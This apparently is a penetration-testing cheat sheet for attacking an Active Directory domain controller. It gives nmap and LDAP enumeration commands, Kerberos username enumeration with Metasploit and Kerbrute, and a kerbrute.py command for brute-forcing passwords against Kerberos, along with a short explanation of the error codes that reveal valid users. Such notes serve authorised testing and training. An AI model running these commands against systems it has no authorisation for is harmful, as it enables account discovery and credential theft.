### Target Enumeration
**Enumerate ports and verify whether a DNS or a Kerberos services are running**
```bash
nmap -Pn -p22,53,80,88,445,5985 <IP>
```

**With the information obtained, further enumerate and identify the `domain name` of the machine using the `ldap` script**
```bash
nmap --script ldap* <IP>
```

**Enumerate `ldap` to identify the `root domain name` of the DC**
```nmap
nmap --script ldap* <IP> | grep -i root
```

### Username Enumeration
You can use the information gathered from the enumeration of the DC to ***discover the user domain accounts*** that authenticate to it. This step is essential as it's possible to ***bruteforce the credentials*** of these user domain accounts with a list of domain usernames, using **Metasploit** or **Kerbrute**.

Both of these methods require existing wordlists of usernames that can be obtained using `OSINT` or `social engineering` techniques.

#### Method one: Metasploit
```bash
use auxiliary/gather/kerberos_enumuser
set domain <ldapServiceName> --> <obtained from target enumeration ldapServiceName: random.local(first part) or look for DC=domain, DC=local that should give you the domain. e.g. domain.local>
set rhosts <dc_ip>
set rport 88
set user_file /usr/share/wordlists/usernames.txt
run
```

#### Method two: Kerbrute
Kerbrute is a tool for user enumeration, brute-forcing, and password spraying against Kerberos authentication. It leverages the way in which Kerberos responds to queries from non-existing users.

When Kerberos receives a ***Ticket Granting Tickets (TGT)*** request with no preauthentication for a non-domain joined user or a non-existent user, it will respond with `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN`. For a valid user, Kerberos will respond with either a TGT in a `AS-REP` or a `KRB5KDC_ERR_PREAUTH_REQUIRED` response.

```bash
./kerbrute userenum /usr/share/wordlists/usernames.txt -d <domain_name> --dc <IP_ADDRESS_DOMAIN_CONTROL>
```

### Kerberos Bruteforcing
Bruteforce the usernames using the Impacket version of Kerbrute. 

```bash
cd Tools/kerbrute-impacket
python kerbrute.py -dc-ip <IP_ADDRESS_DC> -domain <domain_name> -users <username.txt> -passwords <path/to/password/list> -outputfile <outputfile_name>
```